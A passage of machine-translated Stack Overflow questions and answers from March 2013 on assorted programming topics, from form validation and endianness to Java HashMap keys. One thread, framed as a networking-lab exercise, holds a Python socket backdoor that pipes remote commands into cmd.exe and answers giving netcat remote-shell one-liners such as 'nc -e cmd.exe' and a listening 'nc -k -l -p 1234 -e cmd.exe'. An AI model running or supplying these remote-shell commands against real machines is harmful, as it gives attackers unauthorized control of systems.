     document.forms['mpNOV'].submit(); //this submits the form
   }
</script>
</head> 
```

这部分代码在表单所在的页面上，我不习惯使用验证码，所以我希望你能自己弄清楚验证。

原始代码：

```
<form action="http://www.SnapHost.com/captcha/send.aspx" method="post" id="mpNOV"> 
```

改变：

```
<form action="http://www.SnapHost.com/captcha/send.aspx" method="post" name="mpNOV" id="mpNOV"> 
```

我为您的`<form>`元素添加了一个名称，以便使用`document.forms`. 此外，我注意到您在`<form>`SnapHost.com 中的操作。这意味着您的网站将被重定向到 SnapHost.com，并且您应该使用`$_POST`那里获取信息。由于这可能不是您的网站，您应该找出另一种在您的网站上使用 SnapHost 图像而不重定向到 SnapHost.com 的方法

如果这是您的网站，那么您可以使用此 PHP 代码来获取填写表格的数据：

```
 <head>
       <?php
         if($_SERVER['REQUEST_METHOD'] === 'POST') //This if statement checks wether there's been a $_POST request...
         {
            if(isset($_POST['Reservation']) //Is the Reservation button clicked?
            {
               //You can get your data here using $_POST
            }

            if(isset($_POST['Booking']) //Is the Booking button clicked?
            {
               //You can get your data here using $_POST
            }
         }
       ?>
 </head> 
```

该`isset`语句检查一个变量，或者在这种情况下，一个按钮已被“设置”。因此，如果您单击“预订”按钮，则该`if`语句会看到“预订”按钮已设置。

代码的 PHP 部分进入`<head>`您`<form action>`重定向到的页面。

HTML：

```
<td>
    <input type="button" onClick="validateReservation();" value="Hold my reservation" class="submit" name="Reservation" />
</td>
<td width="45%" style="padding-top:10px; padding-bottom:10px; border-top: 1px solid #6f3957;">
    <input type="button" onclick="validateBooking();" value="Book Now!" class="submit" name="Book />
</td> 
```

请注意，我为上面的提交按钮添加了一个名称，还请注意，您应该始终使用标签关闭`<input>`元素。`/>`我相信这是 W3C 标准。另外，到目前为止，我已经阅读了提交按钮不能具有单击功能，但对此我不太确定。

如果您在使用 PHP 和 $_POST 方法获取数据方面需要任何帮助，请看这里：[这里](http://php.net/manual/en/reserved.variables.post.php)。

请注意，stackoverflow.com 不是为您编写完整的代码，首先搜索网络和使用谷歌，如果您在此之后无法弄清楚，请在这里询问。

我希望这可以帮助你。

如果您有任何问题随时问！

# android - 多层 Activity 中的 Android 事件传播

> ID：15650201
> 
> 赞同：0
> 
> 时间：2013-03-27T00:57:43.377
> 
> 标签：android, button, swipe

我试图为有一堆按钮的屏幕添加滑动事件。滑动不适用于按钮。换句话说，如果我在按钮顶部滑动，则无法识别滑动事件。因此，我在 Activity 中尝试了 2 层（顶部和底部）布局。顶部用于处理按钮和其他 UI 元素的滑动和底部。但是，顶层正在处理所有事件，而底部无法访问。有什么方法可以将点击事件发送到底层。

主要要求是，在带有一堆按钮的屏幕中处理滑动和单击。按钮无法识别滑动。

如何解决这个问题呢。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-27T01:05:57.363

如果顶层想要看到触摸事件，您`onTouchEvent()`的顶层必须返回。只有当它处理了事件并且不需要进一步传播时，它才`false`应该返回。`true`

# asp.net-mvc - MVC 路由访问路径

> ID：15650205
> 
> 赞同：0
> 
> 时间：2013-03-27T00:57:55.010
> 
> 标签：asp.net-mvc, routing, asp.net-mvc-routing

我对 MVC 很陌生。我现在面临路由问题。我的项目 URL 是 /account/Create。我可以访问控制器并为 Create 做我的事情，但我需要访问 /account 控制器，因为我需要在该级别编写代码。

/account/create - 我可以访问这个级别的代码
/account - 不知道如何访问这个控制器

**项目结构：**
示例项目

*   控制器
*   模型
*   看法

我应该在以下代码中更改什么？

```
//global.asax.cs
public static void RegisterRoutes(RouteCollection routes)
{
    routes.IgnoreRoute("{resource}.axd/{*pathInfo}");
    routes.MapRoute(
        "Default", // Route name
        "{controller}/{action}/{id}", // URL with parameters
        new { controller = "Home", action = "Index", id = UrlParameter.Optional } //Parameter defaults
    );
} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-27T05:29:30.607

`/account/create`正在访问 Account 控制器中的代码。 `Create`必须是 Account 控制器上的方法（除非您修改默认路由）。您在帐户控制器上定义的任何公共方法都可以通过`/account/method`URL 访问。根据您发布的路线，转到 /account URL 将调用帐户控制器的 Index 方法：

```
routes.MapRoute(
    "Default", // Route name
    "{controller}/{action}/{id}", // URL with parameters
    **new { controller = "Home", action = "Index", id = UrlParameter.Optional }** // Parameter defaults
); 
```

上面的**action = "Index"**部分定义了帐户控制器上的默认方法是什么，因此在这种情况下转到 /account URL 等效于 /account/index URL

而且我刚刚注意到您在问题中拼写错误的帐户，不确定这是否是您的问题；）

* * *

更新

不确定这是否是您所追求的，但如果您需要在 /Account 级别编写代码，您可以在控制器的构造函数中执行此操作。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-27T05:29:34.393

除非您实质上自定义 MVC，否则控制器对应于从 mvc 中的 Controller 派生的类，而操作对应于这些控制器上的方法。

当您说您无法访问控制器/帐户时，您想实现什么？

控制器只是一个 Actions 的容器，所以你需要指定一个 Action。当然，如果未指定操作，您可以使用默认操作。这在上面的路由中默认指定。它被称为索引

# c - 使用位移位运算符将小端转换为大端

> ID：15650208
> 
> 赞同：1
> 
> 时间：2013-03-27T00:58:13.347
> 
> 标签：c

我正在研究字节序。我的小端程序有效，并给出了正确的输出。但我无法绕过大端。以下是我到目前为止所拥有的。我知道我必须使用位移，但我认为我做得不好。我试着问我的助教和教授，但他们没有多大帮助。我一直在关注这个链接（[在 C 中将 big endian 转换为 little endian [不使用提供的 func]](https://stackoverflow.com/questions/2182002/convert-big-endian-to-little-endian-in-c-without-using-provided-func)）以了解更多信息，但仍然无法使其工作。感谢您的帮助。

```
#include <stdio.h>
#include <stdlib.h>

int main(int argc, char *argv[])
{
    FILE* input;
    FILE* output;

    input = fopen(argv[1],"r");
    output = fopen(argv[2],"w");
    int value,value2;
    int i;
    int zipcode, population;
    while(fscanf(input,"%d %d\n",&zipcode, &population)!= EOF)
    {
        for(i = 0; i<4; i++)
        {
        population = ((population >> 4)|(population << 4));
        }
        fwrite(&population, sizeof(int), 1, output);
    }

    fclose(input);      
    fclose(output);

    return 0;
} 
```

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2013-03-27T01:07:59.710

我回答不是为了给你答案，而是帮助你自己解决。

首先问自己：一个字节有多少位？（提示：8）接下来，一个有多少字节`int`？（提示：可能是 4）想象一下内存中的这个 32 位整数：

```
 +--------+
0x|12345678|
  +--------+ 
```

现在在一个 little-endian 机器上按字节想象它。它看起来像这样：

```
 +--+--+--+--+
0x|78|56|34|12|
  +--+--+--+--+ 
```

需要哪些移位操作才能将字节放入正确的位置？

请记住，当您使用类似的位运算符时`>>`，您是在对*位*进行操作。整`1 << 24`数值也将`1`转换为处理器的相反字节序。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-03-27T01:35:22.793

“little-endian”和“big-endian”指的是二进制表示中的字节顺序（我们可以在这里假设 8 位）。当提到机器时，它与内存中字节的顺序有关：在大端机器上，an 的地址`int`将指向它的最高字节，而在小端机器上，an 的地址`int`将指向它的最低字节-顺序字节。

然而，当提到二进制文件（或管道或传输协议等）时，它指的是文件中字节的顺序：“小端表示”将首先具有最低位字节和最高位字节最后的。

如何获得 a 的最低位字节`int`？那是低 8 位，所以它是`(n & 0xFF)`（或者`((n >> 0) & 0xFF)`，您将在下面看到的有用性）。

下一个最低位字节是`((n >> 8) & 0xFF)`. 下一个最低位字节是`((n >> 16) & 0xFF)`... 或`(((n >> 8) >> 8) & 0xFF)`. 等等。

因此，您可以从`n`循环中删除字节并一次输出一个字节......您可以使用`fwrite`它，但使用`putchar`or更简单`putc`。

你说你的老师要求你使用`fwrite`. 有两种方法可以做到这一点：1）`fwrite(&n, 1, 1, filePtr)`如上所述在循环中使用。2）使用循环`int`通过将字节以所需顺序存储在`char`数组中而不是输出它们来重新排序您的值，然后使用`fwrite`将其写出。后者可能是您老师的想法。

请注意，如果你只是`fwrite`用来输出你的`int`它将工作......*如果*你在一个小端机器上运行，其中的字节`int`已经以正确的顺序存储。但是如果在大端机器上运行，字节会倒退。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-03-27T02:23:24.327

这个问题的大多数答案的问题是可移植性。我在[这里](https://stackoverflow.com/questions/15529994/most-efficient-way-to-store-an-unsigned-16-bit-integer-to-a-file/15532021)提供了一个可移植的答案，但这收到的积极反馈相对较少。请注意，C 将未定义行为定义为：在使用不可移植或错误程序构造或*错误数据*时的行为，本国际标准对此没有任何要求。

我将在这里给出的答案不会假设`int`宽度为 16 位。它会让您了解如何表示“更大的 int”值。这是相同的概念，但使用动态循环而不是两个`fputc`s。

`sizeof int`声明一个无符号字符数组：`unsigned char big_endian[sizeof int];`

将符号和绝对值分开。

```
int sign = value < 0;
value = sign ? -value : value; 
```

从 0 循环`sizeof int`，写入最低有效字节：

```
size_t foo = sizeof int;
do {
    big_endian[--foo] = value % (UCHAR_MAX + 1);
    value /= (UCHAR_MAX + 1);
} while (foo > 0); 
```

现在插入符号：`foo[0] |= sign << (CHAR_BIT - 1);`

很简单吧？小端法同样简单。只需颠倒循环的顺序，从 0 到`sizeof int`，而不是从`sizeof int`到 0：

```
size_t foo = 0;
do {
    big_endian[foo++] = value % (UCHAR_MAX + 1);
    value /= (UCHAR_MAX + 1);
} while (foo < sizeof int); 
```

可移植方法更有意义，因为它们定义明确。

# vb.net - 验证字符串用户输入

> ID：15650210
> 
> 赞同：0
> 
> 时间：2013-03-27T00:58:20.260
> 
> 标签：vb.net, validation

我的问题是我试图让用户只能输入“a、b、c 或 d”。如果他们没有输入这四个字母之一，我宁愿让它出错，而不是用户只能输入这些字母。我只能找到对数字数据执行类似操作的资源（使用 try catch）。任何网站或提示都会很棒。

```
 If String.Compare(TextBox2.Text, "a", True) = 0 AndAlso String.Compare(TextBox21.Text, "a", True) = 0 Then
                'MessageBox.Show("A")
                totCorrect = totCorrect + corAns
            ElseIf String.Compare(TextBox2.Text, "b", True) = 0 AndAlso String.Compare(TextBox21.Text, "b", True) = 0 Then
                'MessageBox.Show("B")
                totCorrect = totCorrect + corAns
            ElseIf String.Compare(TextBox2.Text, "c", True) = 0 AndAlso String.Compare(TextBox21.Text, "c", True) = 0 Then
                'MessageBox.Show("C")
                totCorrect = totCorrect + corAns
            ElseIf String.Compare(TextBox2.Text, "d", True) = 0 AndAlso String.Compare(TextBox21.Text, "d", True) = 0 Then
                'MessageBox.Show("D")
                totCorrect = totCorrect + corAns
            Else
                totWrong = totWrong + wrgAns
                Label13.Visible = True
            End If 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-27T01:12:08.297

这应该可以解决问题

```
Private Sub TextBox1_KeyPress(sender As Object, e As KeyPressEventArgs) Handles TextBox1.KeyPress

    Dim allowableChar As New List(Of Char) From {"a"c, "b"c, "c"c, "d"c}

    Call allowableChar.AddRange(allowableChar.Select(Function(c) Convert.ToChar(c.ToString().ToUpper())).ToList())

    If Not (allowableChar.Contains(e.KeyChar) OrElse e.KeyChar = Convert.ToChar(Keys.Delete) OrElse e.KeyChar = Convert.ToChar(Keys.Back)) Then
        e.Handled = True
    End If

End Sub 
```

也将`Call allowableChar.AddRange(...)`大写字符添加到列表中。就像现在一样，每次执行该方法时都会生成一个新列表，这有点浪费...如果您使用这段代码，我建议您将允许的字符列表作为类级变量并仅填充它一次在表单的构造函数中。

要只允许每种类型的一个字符，请使用以下命令：

```
Private Sub TextBox1_KeyPress(sender As Object, e As KeyPressEventArgs) Handles TextBox1.KeyPress

    Dim allowableChar As New List(Of Char) From {"a"c, "b"c, "c"c, "d"c}

    Call allowableChar.AddRange(allowableChar.Select(Function(c) Convert.ToChar(c.ToString().ToUpper())).ToList())

    If Not (allowableChar.Contains(e.KeyChar) OrElse e.KeyChar = Convert.ToChar(Keys.Delete) OrElse e.KeyChar = Convert.ToChar(Keys.Back)) Then
        e.Handled = True
    Else
        If Me.TextBox1.Text.Count(Function(c) c = e.KeyChar) >= 1 Then
            e.Handled = True
        End If
    End If

End Sub 
```

# sql - 列上的 sql max

> ID：15650215
> 
> 赞同：0
> 
> 时间：2013-03-27T00:58:59.843
> 
> 标签：sql

我有一张桌子

```
id  |  sequence | name | status...
1         0       name1   A
2         1       name1   A
3         2       name1   A
4         0       name2   I
5         0       name3   I 
```

查询不采用 name 列，因此 select * from table where status = 'A'

我想要的是只得到这样的最大序列。

```
id  |  sequence | name | status..
3         2       name1   A 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-03-27T01:00:28.333

`SELECT * FROM table ORDER BY sequence DESC LIMIT 1`

或者

`SELECT * FROM table WHERE sequence=(SELECT MAX(sequence) FROM table)`

# python - python子进程stdin.write一个字符串错误22无效参数

> ID：15650216
> 
> 赞同：0
> 
> 时间：2013-03-27T00:59:03.507
> 
> 标签：python

我有两个与套接字通信的 python 文件。当我将数据传递给 stdin.write 时，出现错误 22 无效参数。编码

```
a="C:\python27\Tools"
proc = subprocess.Popen('cmd.exe', cwd=a ,universal_newlines = True, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
data = s.recv(1024) # s is the socket i created
proc.stdin.write(data) ##### ERROR in this line
output = proc.stdout.readline()
print output.rstrip()
remainder = proc.communicate()[0]
print remainder 
```

**更新** OK 基本上我想在网络实验室内的 localhost 中在系统上创建类似后门的东西。这是出于教育目的。我有两台机器。1）正在运行ubuntu，***我在服务器上有这段代码：***

```
import socket,sys
s=socket.socket()
host = "192.168.2.7" #the servers ip
port = 1234
s.bind((host, port))
s.listen(1)                 #wait for client connection.

c, addr = s.accept()     # Establish connection with client.
print 'Got connection from', addr
c.send('Thank you for connecting')

while True:
    command_from_user = raw_input("Give your command: ")  #read command from the user
    if command_from_user == 'quit': break
    c.send(command_from_user)  #sending the command to client
c.close()                # Close the connection 
```

***为客户提供以下代码：***

```
import socket 
import sys
import subprocess, os
s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)

print 'Socket created'

host = "192.168.2.7" #ip of the server machine
port = 1234
s.connect((host,port)) #open a TCP connection to hostname on the port
print s.recv(1024) 

a="C:\python27\Tools"

proc = subprocess.Popen('cmd.exe', cwd=a ,universal_newlines = True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)

while True:
    data = s.recv(1024)
    if (data == "") or (data=="quit"): 
        break
    proc.stdin.write('%s\n' % data)
    proc.stdin.flush()
    remainder = proc.communicate()[0]
    print remainder

    stdoutput=proc.stdout.read() + proc.stderr.read()

s.close #closing the socket 
```

并且错误在客户端文件中

> Traceback（最近一次调用最后一次）：文件“ex1client2.py”，第 50 行，在 proc.stdin.write('%s\n' % data) ValueError: I/O operation on closed file

基本上我想从服务器运行串行命令到客户端并将输出返回到服务器。执行第一个命令，第二个命令我收到此错误消息。导致我找到这个解决方案的主要问题是 chanhing directory 命令。当我执行 cd "path" 时它不会改变。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-03-27T21:24:34.560

您的新代码有一个不同的问题，这就是它引发类似但不同的错误的原因。让我们看一下关键部分：

```
while True:
    data = s.recv(1024)
    if (data == "") or (data=="quit"): 
        break
    proc.stdin.write('%s\n' % data)
    proc.stdin.flush()
    remainder = proc.communicate()[0]
    print remainder
    stdoutput=proc.stdout.read() + proc.stderr.read() 
```

问题是每次通过此列表时，您都在调用`proc.communicate()`. 正如[文档](http://docs.python.org/2/library/subprocess.html#subprocess.Popen.communicate)解释的那样，这将：

> 将数据发送到标准输入。从 stdout 和 stderr 读取数据，直到到达文件结尾。等待进程终止。

所以，在这个调用之后，子进程已经退出，管道全部关闭。但是下一次通过循环时，您仍然尝试写入其输入管道。由于该管道已关闭，您会得到`ValueError: I/O operation on closed file`，这正是它所说的。

如果要在单独的`cmd.exe`shell 实例中运行每个命令，则必须将`proc = subprocess.Popen('cmd.exe', …)`位移动到循环中。

另一方面，如果你想将命令一个一个地发送到同一个 shell，你不能调用`communicate`; 你必须写`stdin`，读`stdout`，`stderr`直到你知道他们已经完成，并在下一次循环中保持一切打开。

第一个的缺点很明显：如果您`cd \Users\me\Documents`在第一个命令中执行 a，然后`dir`在第二个命令中执行，并且它们在完全不同的 shell 中运行，您最终将获得目录列表`C:\python27\Tools`而不是`C:\Users\me\Documents`.

但是第二个的缺点也很明显：您需要编写代码，以某种方式知道每个命令何时完成（可能是因为您再次收到提示？），或者可以同时阻止`proc.stdout`, `proc.stderr`, 和`s`所有. （并且不会意外地使管道死锁。）而且您甚至不能将它们全部扔进 a `select`，因为管道不是套接字。因此，唯一真正的选择是为`stdout`和另一个创建一个读取线程`stderr`，或者从 PyPI 中获取一个异步子进程库，或者使用`twisted`另一个有自己的异步子进程管道方式的框架。

如果您查看 的源代码[`communicate`](http://hg.python.org/cpython/file/2.7/Lib/subprocess.py#l775)，您可以看到线程应该如何工作。

* * *

同时，作为旁注，您的代码还有另一个非常严重的问题。您期望每个`s.recv(1024)`人都会返回一个命令。这不是 TCP 套接字的工作方式。您将在一个中获得前 2-1/2 个命令`recv`，然后在下一个中获得 1/4 个命令，依此类推。

在本地主机上，甚至是家庭局域网上，当你只是发送一些小消息时，它会在 99% 的时间内工作，但你仍然必须处理那 1% 的时间，否则你的代码有时会神秘地中断。而在互联网上，甚至是许多真实的局域网上，它只能在 10% 的时间内工作。

因此，您必须实现某种以某种方式分隔消息的协议。

幸运的是，对于简单的情况，Python 为您提供了一个非常简单的解决方案：[`makefile`](http://docs.python.org/2/library/socket.html#socket.socket.makefile). 当命令由换行符分隔时，您可以同步阻塞，直到获得完整的命令，这是微不足道的。而不是这个：

```
while True:
    data = s.recv(1024) 
```

......只需这样做：

```
f = s.makefile()
while True:
    data = f.readline() 
```

您只需要记住`close`两者`f`和`s`之后（或`s`之后`makefile`，和`f`之后）。更惯用的用法是：

```
with s.makefile() as f:
    s.close()
    for data in f: 
```

* * *

最后一件事：

> 好的，基本上我想在系统上创建类似后门的东西，在网络实验室内的本地主机中

“本地主机”表示您正在运行的同一台机器，因此“网络实验室内的本地主机”没有意义。我假设您在这里只是指“主机”，在这种情况下，整个事情都是有道理的。

* * *

如果您不需要使用 Python，则可以使用[netcat](http://en.wikipedia.org/wiki/Netcat)使用单线器来完成这一切。有几个不同的版本，语法略有不同。我相信 Ubuntu 内置了 GNU netcat；如果没有，它可能可以使用`apt-get netcat`or安装`apt-get nc`。Windows 没有附带任何东西，但您可以获得几乎任何变体的端口。

“netcat remote shell”的快速谷歌搜索出现了一堆博客文章、论坛消息，甚至是展示如何做到这一点的视频，例如[Using Netcat To Spawn A Remote Shell](http://jkeohan.wordpress.com/2010/04/30/using-netcat-to-spawn-a-remote-shell/)，但你最好在谷歌上搜索 netcat 教程反而。

更常见的设计是让“后门”机器（你的 Windows 机器）监听一个端口，而另一台机器（你的 Ubuntu）连接到它，所以这就是大多数博客文章/等等。会告诉你。这个方向的优点是你的“后院服务器”永远监听——你可以连接、做一些事情、退出、稍后再连接等等，而不必回到 Windows 盒子并开始一个新的连接。

但反过来，在 Windows 机器上使用后院客户端也同样简单。在你的 Ubuntu 机器上，启动一个服务器，它将终端连接到第一个连接：

```
nc -l -p 1234 
```

然后在您的 Windows 机器上，连接到该服务器，并将其连接到`cmd.exe`. 假设您已经安装了 GNU 语法变体：

```
nc -e cmd.exe 192.168.2.7 1234 
```

而已。比用 Python 编写要简单得多。

对于更典型的设计，Windows 上的后门服务器运行如下：

```
nc -k -l -p 1234 -e cmd.exe 
```

然后你从 Ubuntu 连接：

```
nc windows.machine.address 1234 
```

或者您甚至可以添加`-t`到后门服务器，然后连接`telnet`而不是`nc`.

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-27T01:06:06.520

问题是您实际上根本没有打开子进程，因此管道正在关闭，因此您正在尝试写入不存在的内容。（我很确定 POSIX 保证你会在`EPIPE`这里得到一个，但在 Windows 上，`subprocess`首先没有使用 POSIX 管道，所以不能保证你会得到什么。但你是肯定会*出错*。）

发生这种情况的原因是您试图打开一个名为`'\n'`（如换行符，而不是反斜杠和 n）的程序。我认为这在 Windows 上甚至不合法。而且，即使是这样，我也非常怀疑您`'\n.exe'`的路径上有一个名为或类似名称的可执行文件。

如果您不使用`shell=True`. 在这种情况下，它`Popen`本身会引发一个异常（an `ENOENT`），它会告诉你类似的信息：

```
OSError: [Errno 2] No such file or directory: '
' 
```

……这会更容易理解。

一般来说，`shell=True`除非你真的需要一些 shell 功能，否则你不应该使用它。您需要一个 shell 功能并且还需要手动读写管道是非常罕见的。

如果您不重复使用`data`来表示两个完全不同的事物（要运行的程序的名称，以及从套接字传递到管道的数据），那么它也不会那么混乱。

# batch-file - 批处理到exe安装adblock plus使用批处理文件命令

> ID：15650217
> 
> 赞同：-1
> 
> 时间：2013-03-27T00:59:11.250
> 
> 标签：batch-file

> @echo 关闭
> 
> 启动 firefox.exe "file:///%tmp%/tmp-ho2.xpi"

突然文件无法安装，因为路径不正确，因为执行它后，exe程序在临时文件夹中创建一个新的随机名称文件夹。我无法配置我应该在“file:///%tmp%”中添加什么文件夹名称/?????/tmp-ho2.xpi"

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-27T01:09:19.877

```
start firefox.exe "%~p0\tmp-ho2.xpi" 
```

`%~p0`扩展至运行批处理程序的目录。

# c# - DirectoryInfo.CreationTime 返回奇怪的日期

> ID：15650218
> 
> 赞同：4
> 
> 时间：2013-03-27T00:59:16.653
> 
> 标签：c#, .net-3.5

我正在使用 DirectoryInfo.CreationTime 来获取创建目录的日期，但是它返回奇怪的日期`{21/11/1617 0:00:00}`

```
var directoryInfo = new DirectoryInfo("C:\\testFolder");
var lastWriteTime = directoryInfo.LastWriteTime; // correct value
var creationTime = directoryInfo.CreationTime; // Date = {21/11/1617 0:00:00}
var creationTimeUtc = directoryInfo.CreationTimeUtc; // Date = {21/11/1617 0:00:00} 
```

任何想法？

**此外：**

位于 NAS 共享中的文件夹，有些文件夹返回正确的值，有些则不是 我做了以下测试：

1.  重新启动我的机器并检查数据和时间是否设置正确
2.  从另一台机器运行应用程序
3.  使用 .NET 4.0 VS2010 重新创建应用程序
4.  从不同的操作系统 windows 7 运行应用程序

全部返回相同的值。但是，如果我选择文件夹属性，则创建日期设置为 2008。这是一个错误吗？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-03-27T03:56:18.957

我可以对“奇怪的约会”有所了解。

Windows 文件时间基于 1601 年 1 月 1 日。

> 文件时间是一个 64 位值，表示自协调世界时间 (UTC) 1601 年 1 月 1 日凌晨 12:00 以来经过的 100 纳秒间隔数。当应用程序创建、访问和写入文件时，系统会记录文件时间。

^([http://msdn.microsoft.com/en-us/library/windows/desktop/ms724290(v=vs.85).aspx](http://msdn.microsoft.com/en-us/library/windows/desktop/ms724290(v=vs.85).aspx))

看起来您的文件系统报告了一个 16 年的偏移量`DirectoryInfo`（它继承自`FileSystemInfo`调用 的类[`GetFileAttributesEx()`](http://msdn.microsoft.com/en-us/library/windows/desktop/aa364946(v=vs.85).aspx)）。

**.Net 包装器**

```
public DateTime CreationTimeUtc
{
    get{
        long fileTime = (long)((ulong)this._data.ftCreationTimeHigh << 32 | (ulong)this._data.ftCreationTimeLow);
        return DateTime.FromFileTimeUtc(fileTime);
    }
} 
```

`DateTime.FromFileTimeUtc`添加一个等于 1/1/1601 的值：

```
long ticks = fileTime + 504911232000000000L;
return new DateTime(ticks, DateTimeKind.Utc); 
```

我找不到偏移量（16 年）的任何意义。DST 错误或闰年似乎太大了，甚至是几个世纪以来累积的。

我确实认为两者都返回完全相同的日期是很奇怪`CreationTime`的`CreationTimeUtc`（除非您的当地时间与UTC相同）。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-27T02:55:04.280

CreationTime 上的 msdn 文档讨论了可能导致此问题的一系列问题

查看下面此链接的备注部分

[http://msdn.microsoft.com/en-IN/library/system.io.filesysteminfo.creationtime.aspx](http://msdn.microsoft.com/en-IN/library/system.io.filesysteminfo.creationtime.aspx)

它可能是未更新的缓存值。为此，您可以使用[Refresh](http://msdn.microsoft.com/en-IN/library/system.io.filesysteminfo.refresh.aspx)方法。如评论中所示，一些旧平台也可能会给您带来麻烦。

# javascript - 无法在我的 JavaScript 下拉菜单中显示 XML。为什么这不起作用？

> ID：15650222
> 
> 赞同：0
> 
> 时间：2013-03-27T00:59:24.410
> 
> 标签：javascript, xml, drop-down-menu

```
<script src="http://ajax.googleapis.com/ajax/libs/jquery/1.7.2/jquery.min.js" type="text/javascript"></script>

<script type="text/javascript">
$(document).ready(function () {
    $.ajax({
        type: "GET",
        url: "XML/Website.xml",
        dataType: "xml",
        success: function (xml) {
            var arr = new Array();
            $(xml).find("board").each(function () {
                var option = $(this).find('brand').text();

                if ($.inArray(option, arr) > -1) {
                    // Do nothing 
                }
                else {
                    $('#dropdown').append('<option>' + option + '</option>');
                    arr.push(option);
                }

            });
        }
    });
});
</script>

<form>
<select id="dropdown">
<option></option>
</select>
</form>

<script src="http://ajax.googleapis.com/ajax/libs/jquery/1.7.2/jquery.min.js"     type="text/javascript"></script>

<script type="text/javascript">

$(document).ready(function () {
    $.ajax({
        type: "GET",
        url: "XML/Website.xml",
        dataType: "xml",
        success: function (xml) {
            $(xml).find('board').each(function () {
                var image = $(this).find('image').text();
                var name = $(this).find('name').text();
                var brand = $(this).find('size').text();
                var brand = $(this).find('camber').text();
                var price = $(this).find('price').text();
                $('#table').append('<tr><td><img width="250px" src="' + image +     '"/></td><td>' + name + '</td><td>' + brand + '</td><td>' + price + '</td></tr>');
            });
        }
    });
});

</script>

<table id="table" border="1" cellspacing="5" cellpadding="20" class="center">
  <tr><td></td><th>Name</th><th>Camber</th><th>Price</th><th>Size</th></tr>
</table>

</body>
</html> 
```

我的 XML 数据正在页面上显示，但是当我使用下拉菜单选择要选择的具体内容时，它不会改变任何内容。我不知道我做错了什么。

我的 XML 标签都是正确的，我已经确定了。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-27T17:38:21.097

在您发布的代码中，当您在下拉列表中选择某些内容时，我看不到您要求它在哪里更改任何内容。您希望它做什么？您需要在下拉列表中添加一个更改侦听器，并告诉它更改时要做什么，就像这样......

```
$("#dropdown").change(function() {
  //Do what you want to do when the drop down is changed.
  //You can get the text of the drop down like this...
  var selected = $("#dropdown option:selected").text();
}); 
```

另外，作为旁注，请尝试重构您的代码，以便您只进行一次 ajax 调用，并将输出用于两者。看起来您为相同的数据调用了两次相同的服务，这是无缘无故的额外工作。

# java - 哈希映射数据类型是否有任何限制

> ID：15650232
> 
> 赞同：2
> 
> 时间：2013-03-27T01:00:34.330
> 
> 标签：java

hash map和hash table中的key类型有什么限制吗？----面试题。我认为是的，我们可以根据需要对其进行自定义。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-27T01:21:13.357

从技术上讲，没有。通常，您希望使用实现 equals() 和 hashCode() 的对象，尽管这不是绝对必要的。如果你不这样做，那么它将使用 Object 定义的比较对象身份的基本实现。很多时候，这是不合适的，但有时很好。

从技术上讲，只要在 equals() 和 hashCode() 实现中使用的值是不可变的，键就不需要是不可变的。例如，如果你的类 Foo 使用字符串“foo”作为它的一部分，那么这个值“foo”不能改变。这是因为出于效率原因，哈希映射根据 hashCode() 值将键放入桶中。如果 hashCode 突然改变，hash map 是不知道的，并且密钥现在将存在于错误的存储桶中，您将遇到令人讨厌的错误，因为这样可能在您的 map 中有“重复”对象。希望这是有道理的。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-27T01:35:03.030

需要考虑的几件事：

1.  就“类型”而言，您不能使用原始类型。这是Java的语言限制。eg`HashMap<int, Foo>`无效，您需要使用`HashMap<Integer, Foo>`

2.  根据 HashMap 的工作方式，key 应该有一个有意义的 hashCode() 和 equals() 实现。它如何“有意义”取决于您的需要。Object 中的默认实现可能已经满足了您的需求，但您需要意识到这一点。

3.  一旦将对象实例作为键放入 Map 中，其 hashCode() 和 equals() 应该保持一致。您永远不应该放入地图，并将对象实例的状态更改为 Key 并导致 hashCode()/equals() 返回不同的值。确保它的最简单方法当然是使用不可变对象作为键。但是，使用可变对象仍然可以，但在您的代码中，您确保不会发生更改键的状态。

# java - Soundtouch 库的 Java 包装器

> ID：15650233
> 
> 赞同：6
> 
> 时间：2013-03-27T01:00:38.150
> 
> 标签：java, android, soundtouch

除了这里指出的之外，我还没有找到任何用于 Soundtouch 的 Java 包装器：
[Android 上的 SoundTouch？](https://stackoverflow.com/questions/1978228/soundtouch-on-android)

据我尝试，这个包装器应该只在 Windows 上工作，但我正在处理`Linux`. 我对 C++ 开发不是很熟悉，这就是为什么我想尽可能地把我的工作留在 Java 上。

有人知道那个包装器的替代品吗？

# java - 无法阅读由 iText __OKBPDF 生成的 pdf

> ID：15650237
> 
> 赞同：0
> 
> 时间：2013-03-27T01:01:13.857
> 
> 标签：java, android, itext

```
import android.os.Bundle;
import android.app.Activity;
import android.view.Menu;
import java.io.FileOutputStream;

import android.app.Activity;
import android.os.Bundle;
import android.os.Environment;

import com.itextpdf.text.Document;
import com.itextpdf.text.Paragraph;

    import com.itextpdf.text.pdf.PdfWriter;

public class MainActivity extends Activity {
    private static String FILE = "/HelloWorld.pdf";
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
</i>

        try {
            Document document = new Document();
            boolean mExternalStorageAvailable = true;
            boolean mExternalStorageWriteable = false;
            String state = Environment.getExternalStorageState();

            if (Environment.MEDIA_MOUNTED.equals(state)) {
            // We can read and write the media
            mExternalStorageAvailable = mExternalStorageWriteable = true;
            } else if (Environment.MEDIA_MOUNTED_READ_ONLY.equals(state)) {
            // We can only read the media
            mExternalStorageAvailable = true;
            mExternalStorageWriteable = false;
            } else {
            // Something else is wrong. It may be one of many other states, but all we need
            //  to know is we can neither read nor write
